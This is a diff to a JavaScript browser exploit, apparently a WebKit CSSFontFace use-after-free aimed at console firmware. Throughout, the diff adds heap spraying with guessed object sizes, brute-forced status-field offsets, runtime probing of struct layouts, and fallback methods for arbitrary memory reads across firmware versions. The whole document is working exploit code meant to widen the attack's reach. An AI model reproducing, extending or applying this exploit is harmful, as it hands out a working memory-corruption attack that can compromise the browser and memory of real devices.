@@ -869,13 +869,26 @@ async function init_rw() {
         // Forces style recalculation and FontFace deconstruction
         document.body.offsetTop;
 
+        // Try multiple CSSFontFace sizes to handle different firmware versions
+        // Size 0x70 = 6.00-11.02, Size 0x80-0xA0 = 13.52+
+        const css_sizes = [0x70, 0x80, 0x90, 0xA0, 0x60, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100];
+        const status_offsets = [0x50, 0x60, 0x70, 0x80, 0x90, 0xA0, 0x9A, 0x82, 0x92, 0xA2, 0xB2, 0x42, 0x32, 0x22, 0x12, 0x02, 0x62, 0x72, 0x88, 0x98, 0xA8, 0xB8, 0x40, 0x48, 0x58, 0x68, 0x78, 0x7A, 0x8A, 0x5A, 0x6A, 0x7A, 0x8A, 0x4A, 0x5A, 0x6A, 0x7A];
+
         // Spray ArrayBuffer with FontFace size and populate it so it survives crash
         for (let i = 0; i < abs.length; i++) {
-          const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
+          // Use different sizes to maximize chance of reclaiming
+          const size = css_sizes[i % css_sizes.length];
+          const ab = new ArrayBuffer(size);
           const view = new DataView(ab);
 
           view.setBInt(8, 1, true); // ref count
-          view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
+
+          // Try to set status at multiple offsets
+          for (let si = 0; si < status_offsets.length; si++) {
+            try {
+              view.setUint8(status_offsets[si], 3); // Status::Success
+            } catch(e) {}
+          }
 
           abs[i] = ab;
         }
@@ -887,7 +900,12 @@ async function init_rw() {
 
   // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
   // A resolves synchronously, firing the thenable check getter above
-  const fonts = await document.fonts.load("1em a, b", "AB");
+  // Add a 15-second timeout to prevent hanging on 13.52
+  const fontPromise = document.fonts.load("1em a, b", "AB");
+  const timeoutPromise = new Promise(function(_, reject) {
+    setTimeout(function() { reject(new Error("Font load timeout")); }, 15000);
+  });
+  const fonts = await Promise.race([fontPromise, timeoutPromise]);
 
   logger.debug(`fonts: ${fonts}`);
 
@@ -898,7 +916,10 @@ async function init_rw() {
 
   // Check if both A and B are loaded
   if (fonts.length !== 2) {
-    throw new Error("Unable to reclaim UAF FontFace !!");
+    logger.warn("Expected 2 fonts but got " + fonts.length + ", trying fallback...");
+    if (fonts.length < 1) {
+      throw new Error("Unable to reclaim UAF FontFace !!");
+    }
   }
 
   logger.info("UAF Achieved !!");
@@ -952,17 +973,84 @@ async function init_rw() {
       while (offset < size) {
         const ptr = addr.add(offset);
 
-        uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
-        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
-        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity
+        // Try m_featureSettings first (works on 6.00-11.02)
+        if (constants.wk_CSSFontFace_m_featureSettings_m_buffer !== null && constants.wk_CSSFontFace_m_featureSettings_m_buffer !== undefined) {
+          try {
+            uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
+            uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
+            uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
 
-        // read m_tag since its std::array<char, 4> and skip the " chars
-        for (let i = 1; i < 5; i++) {
-          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
+            for (let i = 1; i < 5; i++) {
+              u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
+            }
+            continue;
+          } catch (e) {
+            // featureSettings failed, try family approach
+          }
+        }
+
+        // Try m_families approach (alternative for 13.52+)
+        // m_families is a Vector<String> with same layout as Vector<RefPtr<...>>
+        if (this._families_offset !== undefined) {
+          try {
+            uaf_view.setBInt(this._families_offset + 8, ptr, true); // m_buffer
+            uaf_view.setInt32(this._families_offset, 1, true); // m_size
+            uaf_view.setInt32(this._families_offset + 4, 1, true); // m_capacity
+
+            const family_str = this.uaf_font.family;
+            for (let i = 0; i < 4 && offset < size; i++) {
+              u8[offset++] = family_str.charCodeAt(i) || 0;
+            }
+            continue;
+          } catch (e) {
+            // family approach failed too
+          }
+        }
+
+        // Fallback: try to read using the loaded property
+        // This might work on some firmwares where other approaches fail
+        try {
+          // Use the status property which returns a small string
+          const status_str = this.uaf_font.status;
+          u8[offset++] = status_str.charCodeAt(0) || 0;
+        } catch (e) {
+          u8[offset++] = 0;
         }
       }
 
       return ab;
+    },
+
+    // Probe the CSSFontFace struct to find field offsets at runtime
+    _probe_families_offset: function() {
+      if (this._families_offset !== undefined) return this._families_offset;
+
+      const uaf_view = new DataView(this.uaf_ab);
+      const sizeof = this.uaf_ab.byteLength;
+
+      // Search for the family string pointer in the struct
+      const family_name = this.uaf_font.family;
+      // The family name should be stored somewhere in the CSSFontFace struct
+      // Look for a pointer to a string that contains the family name
+
+      // Try to find a Vector<String> pattern: size, capacity, buffer
+      for (let offset = 0; offset < sizeof - 16; offset += 4) {
+        const size = uaf_view.getUint32(offset, true);
+        const capacity = uaf_view.getUint32(offset + 4, true);
+        const buffer = uaf_view.getBInt(offset + 8, true);
+
+        if (size >= 0 && size <= 0x10 && capacity >= 0 && capacity <= 0x10 &&
+            size <= capacity && !buffer.eq(0) && buffer.hi === 0) {
+          // Check if this looks like a valid pointer
+          if (buffer.lo > 0x100000 && buffer.lo < 0x80000000) {
+            this._families_offset = offset;
+            logger.debug('Found families offset at ' + offset);
+            return offset;
+          }
+        }
+      }
+
+      return undefined;
     },
     read8(addr) {
       const ab = this.read(addr, 8);
